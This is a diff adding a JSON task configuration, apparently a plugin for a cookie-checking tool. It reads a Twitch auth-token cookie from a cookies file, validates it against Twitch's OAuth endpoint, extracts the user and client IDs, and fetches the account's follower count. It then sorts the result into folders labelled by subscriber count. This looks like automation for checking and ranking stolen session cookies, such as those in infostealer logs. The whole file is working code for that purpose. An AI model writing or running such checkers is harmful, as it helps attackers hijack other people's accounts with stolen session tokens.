@@ -1,0 +1,72 @@
+{
+  "name": "Twitch",
+  "author": "MaxUNof",
+  "folder_name": "Twitch",
+  "subfolder_name": "Twitch ({{followers}} subs)",
+  "info_text": "Cookies: {{CookiesPath}}\n\nID: {{user_id}}\nClient ID: {{client_id}}\nFollowers: {{followers}}",
+  "tasks": [{
+    "action": "cookie_get",
+    "url": "https://twitch.tv",
+    "name": "auth-token",
+    "to": "auth-token"
+  }, {
+    "action": "str_compare",
+    "str1": "{{auth-token}}",
+    "str2": "",
+    "on_true": null,
+    "on_false": [{
+        "action": "http_request",
+        "url": "https://id.twitch.tv/oauth2/validate",
+        "type": "GET",
+        "headers": {
+            "Authorization": "OAuth {{auth-token}}"
+        },
+        "to": "twitch"
+    }, {
+        "action": "re_find",
+        "str": "{{twitch}}",
+        "regex": "(?U)\"client_id\":\"(.*)\"",
+        "group_index": 1,
+        "to": "client_id"
+    }, {
+        "action": "str_compare",
+        "str1": "{{client_id}}",
+        "str2": "",
+        "on_true": null,
+        "on_false": [{
+            "action": "re_find",
+            "str": "{{twitch}}",
+            "regex": "(?U)\"user_id\":\"(.*)\"",
+            "group_index": 1,
+            "to": "user_id"
+        }, {
+            "action": "str_compare",
+            "str1": "{{user_id}}",
+            "str2": "",
+            "on_true": null,
+            "on_false": [{
+                "action": "http_request",
+                "url": "https://api.twitch.tv/helix/users/follows?to_id={{user_id}}",
+                "type": "GET",
+                "headers": {
+                    "Authorization": "Bearer {{auth-token}}",
+                    "Client-Id": "{{client_id}}"
+                },
+                "to": "twitch"
+            }, {
+                "action": "re_find",
+                "str": "{{twitch}}",
+                "regex": "(?U)\"total\":(\\d+)",
+                "group_index": 1,
+                "to": "followers"
+            }, {
+                "action": "print",
+                "text": "ID: {{user_id}} | Followers: {{followers}}"
+            }, {
+                "action": "return",
+                "result": true
+            }]
+        }]
+    }]
+  }]
+}
